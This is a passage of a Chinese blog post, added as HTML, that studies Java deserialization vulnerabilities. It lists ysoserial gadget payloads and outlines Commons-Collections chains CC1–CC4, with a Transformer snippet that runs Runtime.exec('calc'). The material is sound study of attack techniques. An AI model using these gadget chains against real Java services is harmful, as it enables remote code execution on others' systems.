@@ -1,0 +1,830 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="springtime">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="概述序列化与反序列化​	反序列化漏洞是web安全中老生常谈的问题，提及序列化与反序列化首先有几个问题可以探讨一下：  为什么需要序列化与反序列化？ 序列化与反序列化支持传递哪些信息？ 序列化后的数据以什么样的格式传递？以何种方式解析？  下面逐一回答。 1.为什么需要序列化与反序列化？​	(1)持久化：对象是存储在内存中的堆区的，但是如果内存停止使用了，对象也不存在了。序列化可以将对象转化成字节序">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java反序列化漏洞(一)">
+<meta property="og:url" content="http://example.com/2023/05/25/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(%E4%B8%80)/index.html">
+<meta property="og:site_name" content="spring&#39;s blog">
+<meta property="og:description" content="概述序列化与反序列化​	反序列化漏洞是web安全中老生常谈的问题，提及序列化与反序列化首先有几个问题可以探讨一下：  为什么需要序列化与反序列化？ 序列化与反序列化支持传递哪些信息？ 序列化后的数据以什么样的格式传递？以何种方式解析？  下面逐一回答。 1.为什么需要序列化与反序列化？​	(1)持久化：对象是存储在内存中的堆区的，但是如果内存停止使用了，对象也不存在了。序列化可以将对象转化成字节序">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-05-25T02:11:59.000Z">
+<meta property="article:modified_time" content="2023-05-31T12:07:08.353Z">
+<meta property="article:author" content="springtime">
+<meta property="article:tag" content="java安全">
+<meta property="article:tag" content="反序列化">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>Java反序列化漏洞(一) - spring&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>springtime</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Java反序列化漏洞(一)"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-05-25 10:11" pubdate>
+          Thursday, May 25th 2023, 10:11 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Java反序列化漏洞(一)</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><p>​	反序列化漏洞是web安全中老生常谈的问题，提及序列化与反序列化首先有几个问题可以探讨一下：</p>
+<ul>
+<li><strong>为什么需要序列化与反序列化？</strong></li>
+<li><strong>序列化与反序列化支持传递哪些信息？</strong></li>
+<li><strong>序列化后的数据以什么样的格式传递？以何种方式解析？</strong></li>
+</ul>
+<p>下面逐一回答。</p>
+<h3 id="1-为什么需要序列化与反序列化？"><a href="#1-为什么需要序列化与反序列化？" class="headerlink" title="1.为什么需要序列化与反序列化？"></a>1.为什么需要序列化与反序列化？</h3><p>​	(1)持久化：对象是存储在内存中的堆区的，但是如果内存停止使用了，对象也不存在了。序列化可以将对象转化成字节序列，可以写进硬盘文件中实现持久化。在其它的内存空间中可以读取字节序列进行反序列化成对象。</p>
+<p>​	(2)网络传输：网络直接传输数据，但是无法直接传输对象，可在传输前序列化，传输完成后反序列化成对象。所以所有可在网络上传输的对象都必须是可序列化的。</p>
+<h3 id="2-序列化与反序列化支持传递哪些信息？"><a href="#2-序列化与反序列化支持传递哪些信息？" class="headerlink" title="2.序列化与反序列化支持传递哪些信息？"></a>2.序列化与反序列化支持传递哪些信息？</h3><p>​	主要包含了对象的类型信息、对象的数据等。一般来讲对于一个对象，可序列化的信息仅有成员属性以及变量类型，不能序列化方法。但有一个例外就是python的pickle模块，pickle序列化字节流中包含opcode，opcode可以实现方法，因此pickle序列化可以传递方法。</p>
+<h3 id="3-序列化后的数据以什么样的格式传递？以何种方式解析？"><a href="#3-序列化后的数据以什么样的格式传递？以何种方式解析？" class="headerlink" title="3.序列化后的数据以什么样的格式传递？以何种方式解析？"></a>3.序列化后的数据以什么样的格式传递？以何种方式解析？</h3><p>​	在不同语言环境下，对象经过序列化后可以有多种格式，简单列举几个：</p>
+<ul>
+<li>php序列化字符串</li>
+<li>Java序列化字节流</li>
+<li>pickle序列化字节流(opcode)</li>
+<li>json、yaml、xml</li>
+</ul>
+<h2 id="Java中的序列化与反序列化"><a href="#Java中的序列化与反序列化" class="headerlink" title="Java中的序列化与反序列化"></a>Java中的序列化与反序列化</h2><p>​	writeObject()&amp;readObject()</p>
+<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><h3 id="原生反序列化"><a href="#原生反序列化" class="headerlink" title="原生反序列化"></a>原生反序列化</h3><p>代码中出现了不安全的原生反序列化接口<code>readObject()</code>就会造成反序列化漏洞，在不同的依赖环境下反序列化利用链也各不相同，常见的可能造成原生反序列化漏洞的危险依赖见项目：<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">ysoserial</a>。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs sh">Payload             Authors                     Dependencies<br>-------             -------                     ------------<br>AspectJWeaver       @Jang                       aspectjweaver:1.9.2, commons-collections:3.2.2<br>BeanShell1          @pwntester, @cschneider4711 bsh:2.0b5<br>C3P0                @mbechler                   c3p0:0.9.5.2, mchange-commons-java:0.2.11<br>Click1              @artsploit                  click-nodeps:2.3.0, javax.servlet-api:3.1.0<br>Clojure             @JackOfMostTrades           clojure:1.8.0<br>CommonsBeanutils1   @frohoff                    commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2<br>CommonsCollections1 @frohoff                    commons-collections:3.1<br>CommonsCollections2 @frohoff                    commons-collections4:4.0<br>CommonsCollections3 @frohoff                    commons-collections:3.1<br>CommonsCollections4 @frohoff                    commons-collections4:4.0<br>CommonsCollections5 @matthias_kaiser, @jasinner commons-collections:3.1<br>CommonsCollections6 @matthias_kaiser            commons-collections:3.1<br>CommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1<br>FileUpload1         @mbechler                   commons-fileupload:1.3.1, commons-io:2.4<br>Groovy1             @frohoff                    groovy:2.3.9<br>Hibernate1          @mbechler<br>Hibernate2          @mbechler<br>JBossInterceptors1  @matthias_kaiser            javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21<br>JRMPClient          @mbechler<br>JRMPListener        @mbechler<br>JSON1               @mbechler                   json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1<br>JavassistWeld1      @matthias_kaiser            javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21<br>Jdk7u21             @frohoff<br>Jython1             @pwntester, @cschneider4711 jython-standalone:2.5.2<br>MozillaRhino1       @matthias_kaiser            js:1.7R2<br>MozillaRhino2       @_tint0                     js:1.7R2<br>Myfaces1            @mbechler<br>Myfaces2            @mbechler<br>ROME                @mbechler                   rome:1.0<br>Spring1             @frohoff                    spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE<br>Spring2             @mbechler                   spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2<br>URLDNS              @gebl<br>Vaadin1             @kai_ullrich                vaadin-server:7.7.14, vaadin-shared:7.7.14<br>Wicket1             @jacob-baines               wicket-util:6.23.0, slf4j-api:1.6.4<br></code></pre></td></tr></table></figure>
+
+<p>实际中的反序列化漏洞例如shiro反序列化、weblogic反序列化、dubbo反序列化都属于原生反序列化漏洞。</p>
+<blockquote>
+<p>dubbo需要开启NativeJava才能执行原生反序列化，开启的方式便是<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12333">最新CVE</a>的一个BUG。</p>
+</blockquote>
+<h3 id="其它协议"><a href="#其它协议" class="headerlink" title="其它协议"></a>其它协议</h3><p>除了原生反序列化之外，还有一些项目支持面向对象的二进制序列化与反序列化，比如**<a target="_blank" rel="noopener" href="http://hessian.caucho.com/doc/hessian-serialization.html">Hessian协议</a>**。它使用<code>HessianInput/HessianOutput</code>、<code>Hessian2Input/Hessian2Output</code>、<code>BurlapInput/BurlapOutput</code>这些方法对对象进行封装自传输。</p>
+<p><strong>@TODO</strong>  关于Hessian反序列化后续会专门写个小文章学习。</p>
+<h1 id="CC链前置知识"><a href="#CC链前置知识" class="headerlink" title="CC链前置知识"></a>CC链前置知识</h1><h2 id="xxxTransfomer"><a href="#xxxTransfomer" class="headerlink" title="xxxTransfomer"></a>xxxTransfomer</h2><p>在<code>org.apache.commons.collections.functors</code>这个package中有很多xxxTransformer，简单介绍几个。</p>
+<ul>
+<li>InvokerTransformer：利用反射的方式执行代码，需要调用<code>transform()</code>触发。</li>
+<li>ChainedTransformer：组合多个Transformer，前一个回调的结果作为后一个回调的输入。</li>
+<li>ConstantTransformer：将任一类转换为<code>ConstantTransformer</code>返回。</li>
+<li>InstantiateTransformer：其<code>transform()</code>会反射调用任意类构造器的<code>newInstance()</code>。</li>
+</ul>
+<p>利用xxxTransformer执行<code>Runtime.getRuntime.exec(&#39;clac.exe&#39;)</code>的代码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">        Transformer[] transformers = &#123;<br><span class="hljs-comment">//              new ConstantTransformer(Runtime.class),</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        chainedTransformer.transform(Runtime.class);<br></code></pre></td></tr></table></figure>
+
+<h2 id="TemplateImpl"><a href="#TemplateImpl" class="headerlink" title="TemplateImpl"></a>TemplateImpl</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-title function_">TemplatesImpl</span><span class="hljs-params">(<span class="hljs-type">byte</span>[][] bytecodes, String transletName, Properties outputProperties, <span class="hljs-type">int</span> indentNumber, TransformerFactoryImpl tfactory)</span> &#123;<br>    <span class="hljs-built_in">this</span>._bytecodes = bytecodes;<br>    <span class="hljs-built_in">this</span>._name = transletName;<br>    <span class="hljs-built_in">this</span>._outputProperties = outputProperties;<br>    <span class="hljs-built_in">this</span>._indentNumber = indentNumber;<br>    <span class="hljs-built_in">this</span>._tfactory = tfactory;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>在ClassLoader中我们提到，利用defineClass()可以加载字节码，<code>TemplateImpl.newTransfomer()</code>允许我们加载任意字节码，调用顺序是：</p>
+<blockquote>
+<p>newTransformer() </p>
+<p>​	 getTransletInstance() </p>
+<p>​		defineTransletClasses() </p>
+<p>​				ClassLoader.defineClass()</p>
+</blockquote>
+<p>具体实现需要注意：</p>
+<ul>
+<li><code>_name</code>不为空</li>
+<li><code>_bytecodes</code>存放字节码</li>
+<li><code>_tfactory</code>必须是TransformerFactoryImpl类</li>
+<li>加载的类必须是AbstractTranslet的子类</li>
+</ul>
+<h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><p>动态代理是设计模式中代理模式的一种，代理模式的定义是：由于某些原因需要给某对象<strong>提供一个代理以控制对该对象的访问</strong>。这时，访问对象不适合或者不能直接引用目标对象，代理对象作为访问对象和目标对象之间的中介。<strong>动态代理使用反射机制在运行时为对象添加代理接口。</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**为HashMap做动态代理，hook HashMap.get()。**/</span><br><span class="hljs-comment">//ExampleInvocationHandler.java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExampleInvocationHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> &#123;<br>    <span class="hljs-keyword">protected</span> Map map;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ExampleInvocationHandler</span><span class="hljs-params">(Map map)</span>&#123;<br>        <span class="hljs-built_in">this</span>.map=map;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        <span class="hljs-keyword">if</span>(method.getName().compareTo(<span class="hljs-string">&quot;get&quot;</span>)==<span class="hljs-number">0</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;Hooked method:&quot;</span>+method.getName()+<span class="hljs-string">&quot;\n&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Object hacked!&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> method.invoke(<span class="hljs-built_in">this</span>.map,args);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//App.java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">App</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">ExampleInvocationHandler</span> <span class="hljs-variable">exampleInvocationHandler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExampleInvocationHandler</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>());<br>        <span class="hljs-comment">//核心：创建代理类</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map)Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, exampleInvocationHandler);<br>        proxyMap.put(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;spring&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> (String) proxyMap.get(<span class="hljs-string">&quot;name&quot;</span>);<br>        System.out.println(result);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="Common-Collections利用链"><a href="#Common-Collections利用链" class="headerlink" title="Common-Collections利用链"></a>Common-Collections利用链</h1><h2 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h2><p>对CC链做一个简单的汇总，入口指原生反序列化调用readObject()的类，出口指下一步链接至触发点的类，触发点指触发执行的类。</p>
+<h3 id="入口"><a href="#入口" class="headerlink" title="入口"></a>入口</h3><ol>
+<li>AnnotationInvocationHandler(CC1、CC3)</li>
+<li>PriorityQueue(CC2、CC4)</li>
+<li>BadAttributeValueExpException(CC5、CC11)</li>
+<li>HashMap(CC6、CCK1&#x2F;2&#x2F;3&#x2F;4)</li>
+<li>HashTable(CC7、CC9)</li>
+<li>HashSet(CC6、CC10)</li>
+<li>TreeBag(CC8)</li>
+</ol>
+<h3 id="出口"><a href="#出口" class="headerlink" title="出口"></a>出口</h3><ol>
+<li>LazyMap.get() &#x3D;&gt; x.transform()<ul>
+<li>CC1、CC3、CC5、CC6、CC7、CC9、CC10、CC11、CCK1&#x2F;2&#x2F;3&#x2F;4</li>
+</ul>
+</li>
+<li>TransformingComparator.compare() &#x3D;&gt; x.transform()<ul>
+<li>CC2、CC4、CC8</li>
+</ul>
+</li>
+</ol>
+<h3 id="触发点"><a href="#触发点" class="headerlink" title="触发点"></a>触发点</h3><h4 id="Transformers"><a href="#Transformers" class="headerlink" title="Transformers"></a>Transformers</h4><p>主要是触发xxxTransformer.transform()方法，不同xxxTransformer的transform()方法有不同的效果。</p>
+<ol>
+<li><code>ChainedTransformer.Transform()</code>：反射执行Runtime.exec()。</li>
+<li><code>InstantiateTransformer.transform()</code>触发TrAXFilter实例化调用newTransformer() &#x3D;&gt; templates<ul>
+<li>见CC3</li>
+</ul>
+</li>
+</ol>
+<h4 id="Templates"><a href="#Templates" class="headerlink" title="Templates"></a>Templates</h4><p>前面我们提到要利用TemplatesImpl加载字节码需要调用<code>TemplatesImpl.newTransformer()</code> ，除了借助TrAXFilter外，TemplatesImpl中还有一个getOutputProperties()方法，注意<strong>它是getattr方法</strong>，因此可以与一些利用链结合。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> Properties <span class="hljs-title function_">getOutputProperties</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.newTransformer().getOutputProperties();<br>    &#125; <span class="hljs-keyword">catch</span> (TransformerConfigurationException var2) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="一些小点"><a href="#一些小点" class="headerlink" title="一些小点"></a>一些小点</h3><ul>
+<li><p>LazyMap.decorate()方法可以修饰任意Map的子类，比如HashMap、TiedMapEntry。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> java.util.Map <span class="hljs-title function_">decorate</span><span class="hljs-params">( Map map, Transformer factory)</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>注意：返回的LazyMap被调用get()方法后会触发map.put()、factory.transform()</strong></li>
+</ul>
+</li>
+<li><p>对于ChainedTransformer要先置入fake-chain，构造完成再填入，以免在序列化的过程中本地触发。</p>
+</li>
+</ul>
+<h2 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h2><ul>
+<li>DEP：commons-collections:3.1</li>
+<li>IN：AnnotationInvocationHandler.readObject()</li>
+<li>OUT：LazyMap.get()</li>
+<li>SINK：transformers-chain</li>
+</ul>
+<blockquote>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">AnnotationInvocationHandler.readObject()<br>Map(Proxy).entrySet()<br>   AnnotationInvocationHandler.invoke()<br>      LazyMap.get()<br>         ChainedTransformer.transform()<br>			&lt;transformers-chain&gt;<br></code></pre></td></tr></table></figure>
+</blockquote>
+<h2 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h2><ul>
+<li>DEP：commons-collections4:4.0</li>
+<li>IN：PriorityQueue.readObject()</li>
+<li>OUT：TransformingComparator.compare()</li>
+<li>SINK：InvokerTransformer.transform() || Templates</li>
+</ul>
+<blockquote>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">PriorityQueue.readObject()<br>   ...<br>      TransformingComparator.compare()<br>         InvokerTransformer.transform()<br>            Method.invoke()<br>               Runtime.<span class="hljs-built_in">exec</span>()<br></code></pre></td></tr></table></figure>
+</blockquote>
+<h2 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h2><ul>
+<li>DEP：commons-collections:3.1</li>
+<li>IN：AnnotationInvocationHandler.readObject()</li>
+<li>OUT：LazyMap.get()</li>
+<li>SINK：Templates</li>
+</ul>
+<blockquote>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sh">AnnotationInvocationHandler.readObject()<br>Map(Proxy).entrySet()<br>   AnnotationInvocationHandler.invoke()<br>      LazyMap.get()<br>      	InstantiateTransformer.transform() <br>        	TrAXFilter.newInstance()<br>        		TransformerImpl.newTransformer()<br>        			&lt;Templates&gt;<br></code></pre></td></tr></table></figure>
+</blockquote>
+<h2 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h2><ul>
+<li>DEP：commons-collections4:4.0</li>
+<li>IN：PriorityQueue.readObject()</li>
+<li>OUT：TransformingComparator.compare()</li>
+<li>SINK：Templates</li>
+</ul>
+<blockquote>
